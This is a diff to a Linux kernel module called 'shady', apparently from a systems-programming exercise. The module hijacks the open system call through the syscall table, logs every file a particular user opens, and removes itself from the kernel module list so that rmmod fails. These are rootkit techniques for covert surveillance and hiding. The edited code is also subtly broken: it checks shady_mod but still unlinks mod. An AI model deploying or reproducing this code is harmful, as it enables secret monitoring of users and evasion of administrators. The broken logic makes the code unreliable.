@@ -44,6 +44,9 @@ uid_t marks_uid = 1001;
 
 asmlinkage int (*old_open) (const char*, int, int);
 
+/* For unhiding */
+struct module *shady_mod;
+
 /* parameters */
 static int shady_ndevices = SHADY_NDEVICES;
 
@@ -59,6 +62,7 @@ static struct class *shady_class = NULL;
 
 asmlinkage int my_open (const char* file, int flags, int mode)
 {
+  /* Found this poking around cred.h. */
   if (__kuid_val(current_uid()) == marks_uid) {
     printk("mark is about to open '%s'\n", file);
   }
@@ -281,15 +285,18 @@ shady_init_module(void)
   }
 
   /* Hijack open */
+  /* Found __NR_open in unistd_64.h or related file. */
   set_addr_rw(system_call_table_address);
   old_open = (asmlinkage int (*) (const char*, int, int))((unsigned long long**)system_call_table_address)[__NR_open];
   ((unsigned long long**)system_call_table_address)[__NR_open] = (unsigned long long *)my_open;
 
-  /* Hide shady. rmmod will no longer work. */
+  /* Hide shady. rmmod will no longer work. Though you might be able to unhide it! */
   /* I saw this in modprobe.c */
   
-  mod = find_module("shady");
-  list_del(&mod->list);
+  shady_mod = find_module("shady");
+  if (shady_mod) { /* Why wouldn't shady be here? */
+    list_del(&mod->list);
+  }
 
   return 0; /* success */
 
